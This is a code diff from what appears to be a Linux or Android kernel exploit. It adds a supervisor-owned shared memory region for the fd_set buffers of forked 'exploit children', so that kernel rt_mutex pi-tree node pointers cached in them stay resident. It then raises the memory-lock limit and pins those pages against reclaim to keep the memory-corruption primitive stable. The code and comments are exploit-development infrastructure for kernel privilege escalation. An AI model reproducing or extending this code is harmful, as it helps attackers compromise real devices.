@@ -27,6 +27,8 @@ struct app_p0_shared_state {
 
 static struct app_p0_shared_state *app_p0_state;
 
+struct slide_shared_fdsets *slide_shared_fds;
+
 void app_publish_p0_offset(uintptr_t offset) {
   if (!app_p0_state) {
     return;
@@ -133,6 +135,43 @@ __attribute__((constructor)) static void load(void) {
   if (app_p0_state == MAP_FAILED) {
     pr_error("app p0 shared state mmap failed errno=%d\n", errno);
     _exit(1);
+  }
+#endif
+
+#if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
+  /*
+   * Hold the slide pselect6 fd_set buffers in a supervisor-owned
+   * MAP_SHARED|MAP_ANONYMOUS region so the kernel rt_mutex pi-tree rb_node
+   * pointers cached into them stay resident until this supervisor exits.
+   * Every fork()'d exploit child inherits the mapping; the pages therefore
+   * survive each child's teardown and are never munmap()-ed here.
+   */
+  slide_shared_fds = mmap(NULL, sizeof(*slide_shared_fds),
+                          PROT_READ | PROT_WRITE,
+                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+  if (slide_shared_fds == MAP_FAILED) {
+    pr_error("slide shared fd_set buffers mmap failed errno=%d\n", errno);
+    _exit(1);
+  }
+  memset(slide_shared_fds, 0, sizeof(*slide_shared_fds));
+  /* Best-effort pinning: MAP_SHARED keeps the VMA alive but not the physical
+     frame. The kernel rt_mutex pi-tree walks these pages through the direct-map
+     alias after a forked child has torn down; if zram reclaims the frame before
+     that walk, the DABT panic family returns against a recycled slab. mlock(2)
+     pins the pages. It is allowed to fail (EPERM under SELinux/RLIMIT_MEMLOCK)
+     — this is a soft guarantee; the supervisor never aborts on refusal. */
+  {
+    struct rlimit memlock_limit;
+    memset(&memlock_limit, 0, sizeof(memlock_limit));
+    if (getrlimit(RLIMIT_MEMLOCK, &memlock_limit) == 0) {
+      memlock_limit.rlim_cur = RLIM_INFINITY;
+      memlock_limit.rlim_max = RLIM_INFINITY;
+      setrlimit(RLIMIT_MEMLOCK, &memlock_limit); /* ignore failure */
+    }
+    if (mlock(slide_shared_fds, sizeof(*slide_shared_fds)) != 0) {
+      pr_warning("slide shared fd_set region mlock failed errno=%d; "
+                 "continuing without memory pinning\n", errno);
+    }
   }
 #endif
 
